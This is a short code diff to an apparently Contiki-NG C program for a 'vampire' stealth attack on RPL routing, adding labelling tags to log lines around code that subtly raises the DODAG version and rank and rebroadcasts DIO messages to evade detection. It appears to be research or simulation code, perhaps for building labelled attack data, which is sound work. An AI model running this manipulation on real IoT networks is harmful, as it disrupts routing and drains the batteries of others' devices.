@@ -67,6 +67,7 @@ PROCESS_THREAD(vampire_stealth_process, ev, data)
   LOG_INFO("============================================\n");
   LOG_INFO("VAMPIRE ATTACK: STEALTH MODE ACTIVATED\n");
   LOG_INFO("Attack strategy: Low-rate manipulation (evade detection)\n");
+  LOG_INFO("TAG: ATTACK_TYPE=STEALTH\n");
   LOG_INFO("============================================\n");
   
   etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
@@ -82,7 +83,7 @@ PROCESS_THREAD(vampire_stealth_process, ev, data)
             uint8_t old_version = curr_instance.dag.version;
             curr_instance.dag.version += SUBTLE_VERSION_INCREMENT;
             
-            LOG_INFO("STEALTH_ATTACK subtle_version: %u -> %u (attack #%lu)\n", 
+            LOG_INFO("STEALTH_ATTACK subtle_version: %u -> %u (attack #%lu) TAG:ACTION=VERSION_MANIP\n", 
                      old_version, curr_instance.dag.version, 
                      (unsigned long)++attack_count);
             
@@ -100,7 +101,7 @@ PROCESS_THREAD(vampire_stealth_process, ev, data)
             // Only slightly increase rank (harder to detect)
             curr_instance.dag.rank += SUBTLE_RANK_INCREMENT;
             
-            LOG_INFO("STEALTH_ATTACK subtle_rank: %u -> %u\n", 
+            LOG_INFO("STEALTH_ATTACK subtle_rank: %u -> %u TAG:ACTION=RANK_MANIP\n", 
                      old_rank, curr_instance.dag.rank);
             
             rpl_icmp6_dio_output(NULL);
